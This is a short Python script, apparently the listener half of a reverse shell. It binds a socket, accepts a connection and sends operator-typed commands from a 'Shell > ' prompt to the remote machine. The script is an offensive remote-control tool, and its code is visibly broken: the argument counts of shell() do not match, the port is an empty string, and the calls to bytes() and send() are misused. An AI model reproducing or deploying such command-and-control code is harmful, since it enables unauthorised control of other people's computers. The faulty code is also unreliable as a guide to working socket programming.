import socket
import sys


host = ''
port = ''

def server():
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  try:
    s.bind((host, port))
  except:
    print("failed to bind", host, "to", port)
    sys.exit()
  s.listen(1)
  conn, addr = s.accept()
  shell(conn, s)


def shell(addr, conn, s):
  while True:
    try:

      cmd = input("Shell > ")
      if cmd == "exit":
        conn.send(b'exit')
        conn.close()
        s.close()
        sys.exit()
      else:
        conn.send(bytes(cmd), encoding='utf8')
    except (KeyboardInterrupt, Exception):
      print("Exititing Shell With", addr[0])
      sys.exit()
      
